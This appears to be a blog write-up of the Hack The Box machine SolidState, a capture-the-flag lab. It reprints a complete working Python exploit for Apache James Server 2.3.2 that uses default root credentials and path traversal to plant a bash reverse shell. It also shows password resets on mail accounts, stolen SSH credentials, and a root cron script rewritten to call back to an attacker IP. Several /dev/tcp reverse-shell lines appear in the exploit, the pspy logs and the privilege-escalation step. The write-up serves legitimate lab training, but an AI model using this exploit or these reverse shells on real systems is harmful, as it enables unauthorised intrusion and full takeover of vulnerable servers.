---
layout: post
title: "Hack The Box: SolidState"
box: "SolidState"
box_ip: "10.129.104.20"
box_os: "Linux"
box_difficulty: "Medium"
box_image: /assets/images/machines/solidstate.png
categories: [hackthebox]
tags: [hackthebox, Vulnerability Assessment, Software & OS exploitation, Default Credentials, Weak Permissions, Python, Apache James, POP, pspy]
---

### SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell.

### Initial Enumeration
First, we run an Nmap scan.
```terminal
┌─[anogota@parrot]─[~/Tools]
└──╼ $sudo nmap -sS -sV -sC -p- -O 10.129.104.20
Nmap scan report for 10.129.104.20
Host is up (0.041s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
At first we can see 5 open ports, i beggin my enumeration with smtp port 25
And that give instant information, with which kind of software 
```terminal
┌─[anogota@parrot]─[~/Tools]
└──╼ $telnet 10.129.104.20 25
Trying 10.129.104.20...
Connected to 10.129.104.20.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 25 Nov 2026 12:20:18 -0500 (EST
```
I search it out in google, and got instantly that 

<img width="732" height="172" alt="image" src="https://github.com/user-attachments/assets/1799f330-e148-45a5-80bc-2a2c067b17ee" />

```bash
#!/usr/bin/python3
# Exploit Title: Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)
# Date: 27/09/2021
# Exploit Author: shinris3n
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

# '''
# This Python 3 implementation is based on the original (Python 2) exploit code developed by 
# Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec.  The following modifications were made:

# 1 - Made required changes to print and socket commands for Python 3 compatibility.
# 1 - Changed the default payload to a basic bash reverse shell script and added a netcat option.
# 2 - Changed the command line syntax to allow user input of remote ip, local ip and listener port to correspond with #2.
# 3 - Added a payload that can be used for testing remote command execution and connectivity.
# 4 - Added payload and listener information output based on payload selection and user input.
# 5 - Added execution output clarifications and additional informational comments throughout the code.

# @shinris3n
# https://twitter.com/shinris3n
# https://shinris3n.github.io/
# '''


import socket
import sys
import time

# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 4:
    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>\n" % sys.argv[0])
    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
    sys.exit(1)

remote_ip = sys.argv[1]
local_ip = sys.argv[2]
port = sys.argv[3]

# Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only

print ("[+]Payload Selected (see script for more options): ", payload)
if '/bin/bash' in payload:
    print ("[+]Example netcat listener syntax to use after successful execution: nc -lvnp", port)


def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print ("[+]Connecting to James Remote Administration Tool...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
    s.recv(1024)
    s.send((user + "\n").encode('utf-8'))
    s.recv(1024)
    s.send((pwd + "\n").encode('utf-8'))
    s.recv(1024)
    print ("[+]Creating user...")
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
    s.recv(1024)
    s.send("quit\n".encode('utf-8'))
    s.close()

    print ("[+]Connecting to James SMTP server...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
    s.send("ehlo team@team.pl\r\n".encode('utf-8'))
    recv(s)
    print ("[+]Sending payload...")
    s.send("mail from: <'@team.pl>\r\n".encode('utf-8'))
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n".encode('utf-8')) if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n".encode('utf-8'))
    recv(s)
    s.send("data\r\n".encode('utf-8'))
    recv(s)
    s.send("From: team@team.pl\r\n".encode('utf-8'))
    s.send("\r\n".encode('utf-8'))
    s.send("'\n".encode('utf-8'))
    s.send((payload + "\n").encode('utf-8'))
    s.send("\r\n.\r\n".encode('utf-8'))
    recv(s)
    s.send("quit\r\n".encode('utf-8'))
    recv(s)
    s.close()
    print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
    if '/bin/bash' in payload:
        print ("[+]Don't forget to start a listener on port", port, "before logging in!")
except:
    print ("Connection failed.")
```

We can at first, that this script are conneting into port 4555, with credentials root root, so i've asked google what was the default credentials for pache James Server 2.3.2, and here the output 

<img width="616" height="57" alt="image" src="https://github.com/user-attachments/assets/5437e0ed-9346-4bc6-af76-f45425f38992" />

So let's connect with port 4555
```terminal
┌─[anogota@parrot]─[~/Tools]
└──╼ $telnet 10.129.104.20 4555
Trying 10.129.104.20...
Connected to 10.129.104.20.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```
And the default credentials are working, here the list of user's
```bash
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
Because we have a POP3 (110 port), maybe there will be some email that track me exploitation, because the script, could not be working, because somebody have to login via SSH
With have a root rights so we can change passwords of all users
```bash
setpassword [username] [password]       sets a user's password
```
So i change password for all users, to password
```bash
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```
Let's begin with researching, hopefully for something interesting.
```terminal
USER james
+OK
PASS password
+OK Welcome james
LIST
+OK 0 0

USER thomas
+OK
PASS password
+OK Welcome thomas
LIST
+OK 0 0
```
Both users above don't have any e-mail that we could display, but Mindy has two.

```terminal
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
```
```bash
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
```
```bash
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@
```

### Gaining Accesss

Okay, now we got SSH credentials for Mindy, so let's begin with exploitation, using the previous exploit.
I've used that exploit https://github.com/CyberQuestor-infosec/Apache-James-Server-2.3.2_Unauthenticated-Remote-Command-Execution-RCE
At first we have to download that exploit
```bash
https://raw.githubusercontent.com/CyberQuestor-infosec/Apache-James-Server-2.3.2_Unauthenticated-Remote-Command-Execution-RCE/refs/heads/main/exploit.py
```
Then i've setup a netcat -lvnp.
The next step was to run an exploit.
```terminal
┌─[✗]─[anogota@parrot]─[~/HTB/SolidState]
└──╼ $python exploit.py 10.129.104.20 10.10.14.90 9001
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.14.90/9001 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 9001
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 9001 before logging in!
```
After running it out, the last task is to run an SSH with Mindy credentials.
```terminal
┌─[✗]─[anogota@parrot]─[~/HTB/SolidState]
└──╼ $ssh mindy@10.129.104.20
mindy@10.129.104.20's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 25 11:36:42 2026 from 10.10.14.90
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
```
And here it is, back to the terminal where you set up a netcat, and you will be able to run commands as a Mindy.
```terminal
┌─[anogota@parrot]─[~/HTB/SolidState]
└──╼ $nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.104.6 38882
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
```
Now let's take a user flag
### user.txt
```terminal
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
cat user.txt
93611be07ffaa14f36d6e********
```
I begin my enumeration on the host, using the linpeas.sh.
At first we have to setup http.server, the will helped us to upload linpeas.sh on attacked server.
```terminal
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Then on a target, navigate to the /tmp directory, and download it from our machine using the command wget, and give executable permision using chmod +x
```terminal
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ wget http://10.10.14.90:8000/linpeas.sh
wget http://10.10.14.90:8000/linpeas.sh
--2026-11-25 08:52:10--  http://10.10.14.90:8000/linpeas.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ chmod +x linpeas.sh
```
And run it out.
```terminal
═════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#writable-files
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```
Here is the first thing that caught my eye.
Because we are able to modify that script, and it is running by root.

```terminal
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
The script look like this
I want to see if it’s being run, so I’ll upload Pspy.
At first we have set up http.server in their directory where pspy is located.
Then we have to upload on the attacked server, and give an executable permision by chmod +x
Here's the results
```terminal
2026/11/25 13:59:24 CMD: UID=0     PID=4546   | bash -c bash -i >& /dev/tcp/10.10.14.90/4444 0>&1 
2026/11/25 13:59:24 CMD: UID=0     PID=4545   | sh -c bash -c "bash -i >& /dev/tcp/10.10.14.90/4444 0>&1" 
2026/11/25 13:59:24 CMD: UID=0     PID=4542   | python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4541   | /bin/sh -c python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4540   | /usr/sbin/CRON -f 
2026/11/25 13:59:24 CMD: UID=0     PID=4481   | bash -i 
2026/11/25 13:59:24 CMD: UID=0     PID=4480   | bash -c bash -i >& /dev/tcp/10.10.14.90/4444 0>&1 
2026/11/25 13:59:24 CMD: UID=0     PID=4479   | sh -c bash -c "bash -i >& /dev/tcp/10.10.14.90/4444 0>&1" 
2026/11/25 13:59:24 CMD: UID=0     PID=4476   | python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4475   | /bin/sh -c python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4474   | /usr/sbin/CRON -f 
2026/11/25 13:59:24 CMD: UID=0     PID=4419   | bash -i 
2026/11/25 13:59:24 CMD: UID=0     PID=4418   | bash -c bash -i >& /dev/tcp/10.10.14.90/4444 0>&1 
2026/11/25 13:59:24 CMD: UID=0     PID=4417   | sh -c bash -c "bash -i >& /dev/tcp/10.10.14.90/4444 0>&1" 
2026/11/25 13:59:24 CMD: UID=0     PID=4414   | python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4413   | /bin/sh -c python /opt/tmp.py 
2026/11/25 13:59:24 CMD: UID=0     PID=4412   | /usr/sbin/CRON -f 
<SNIP>
```
We can see that /opt/tmp.py is running every 3 minutes, so let's smuggle revershell into tmp.py.

### Privilege Escalation

I've made script.py on my machine, then inserted a script from tmp.py into there, and at the end added revershell.
```terminal
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.90/4444 0>&1"')
```
Then i've upload that on attecked machine, using http.server.
When we have that on machine, we have to transfer that code into tmp.py using command cat.
```terminal
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat shell.py > /opt/tmp.py
cat shell.py > /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.90/4444 0>&1"')
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls -la /opt/
ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  169 Nov 25 11:48 tmp.py
```
Then set up a Netcat listener and wait around 3 minutes, and you will be able to obtain a reverse shell with root permissions.
```terminal
┌─[anogota@parrot]─[~/HTB/SolidState]
└──╼ $sudo nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.104.20 42206
bash: cannot set terminal process group (1743): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# whoami
whoami
root
```
### root.txt
```terminal
root@solidstate:~# cd /root
cd /root
root@solidstate:~# cat root.txt
cat root.txt
abf9d39c88f05bed891f561480abc967
```
### Summary
The box was kind of tricky. The enumeration was a key for gaining access; the information about the software that was running was necessary to escalate privilege. That showed us how important it is to update our software; if the software is getting older is highly more risk that will be vulnerable. The box wasn't that easy it test my patient many times

<script>
document.addEventListener("DOMContentLoaded", function() {
  const content = document.querySelector('.markdown-body');
  if (!content) return;

  // Automatyczne dane z Front Matter na górze strony
  const boxName = "{{ page.box }}";
  const boxIp = "{{ page.box_ip }}";
  const boxOs = "{{ page.box_os }}";
  const boxDiff = "{{ page.box_difficulty }}";

  if (!boxName) return;

  // 1. Tworzymy kontener dwukolumnowy (Sidebar + Tekst)
  const wrapper = document.createElement('div');
  wrapper.className = 'blog-layout-wrapper';

  // 2. Tworzymy boczny panel (Sidebar)
  const aside = document.createElement('aside');
  aside.className = 'dynamic-sidebar';
  aside.innerHTML = `<h3 class="sidebar-box-title">HTB: ${boxName}</h3>`;
  
  const ul = document.createElement('ul');
  ul.className = 'sidebar-menu';

  // AUTOMATYKA: Łapiemy wszystkie prawdziwe podrozdziały (h2) z Twojego tekstu
  const headings = content.querySelectorAll('h2');
  
  if (headings.length > 0) {
    headings.forEach((heading, index) => {
      // Generujemy bezpieczne ID dla linku, jeśli nagłówek go nie ma
      if (!heading.id) {
        heading.id = 'section-' + index;
      }
      
      const li = document.createElement('li');
      // Pierwszy element dostaje klasę 'active' na start
      li.className = 'sidebar-item' + (index === 0 ? ' active' : '');
      li.innerHTML = `<a href="#${heading.id}">${heading.innerText}</a>`;
      ul.appendChild(li);
    });
  } else {
    // Rezerwowy punkt, gdyby w poście nie było jeszcze żadnych nagłówków h2
    const li = document.createElement('li');
    li.className = 'sidebar-item active';
    li.innerHTML = `<a href="#">overview</a>`;
    ul.appendChild(li);
  }
  aside.appendChild(ul);

  // 3. Kontener na właściwy tekst artykułu
  const articleContainer = document.createElement('div');
  articleContainer.className = 'main-article-content';

  // Przebudowa struktury kodu na stronie
  content.parentNode.insertBefore(wrapper, content);
  wrapper.appendChild(aside);
  wrapper.appendChild(articleContainer);
  articleContainer.appendChild(content);

  // 4. Generowanie paska parametrów pod głównym tytułem (h1)
  const mainTitle = articleContainer.querySelector('h1');
  if (boxIp || boxOs || boxDiff) {
    const metaBar = document.createElement('div');
    metaBar.className = 'post-htb-metadata-bar';

    const osIcon = boxOs && boxOs.toLowerCase() === 'linux' ? '🐧' : '🪟';
    
    metaBar.innerHTML = `
      <div class="meta-bar-item">
        <span class="meta-bar-label">TARGET IP:</span>
        <span class="meta-bar-value target-ip">${boxIp ? boxIp : 'N/A'}</span>
      </div>
      <div class="meta-bar-item">
        <span class="meta-bar-label">OS:</span>
        <span class="meta-bar-value">${osIcon} ${boxOs ? boxOs : 'N/A'}</span>
      </div>
      <div class="meta-bar-item">
        <span class="meta-bar-label">DIFFICULTY:</span>
        <span class="meta-bar-value diff-text ${boxDiff ? boxDiff.toLowerCase() : ''}">${boxDiff ? boxDiff : 'N/A'}</span>
      </div>
    `;

    // Wstrzykujemy pasek idealnie pod główny nagłówek h1 (np. Anogota9)
    if (mainTitle) {
      mainTitle.parentNode.insertBefore(metaBar, mainTitle.nextSibling);
    } else {
      content.insertBefore(metaBar, content.firstChild);
    }
  }

  // Automatyczne przełączanie podświetlenia menu podczas przewijania strony (Scroll Spy)
  window.addEventListener('scroll', () => {
    let current = '';
    headings.forEach(heading => {
      const headingTop = heading.getBoundingClientRect().top;
      if (headingTop < 100) {
        current = heading.id;
      }
    });

    if (current) {
      document.querySelectorAll('.sidebar-item').forEach(li => {
        li.classList.remove('active');
        const a = li.querySelector('a');
        if (a && a.getAttribute('href') === `#${current}`) {
          li.classList.add('active');
        }
      });
    }
  });
});
</script>
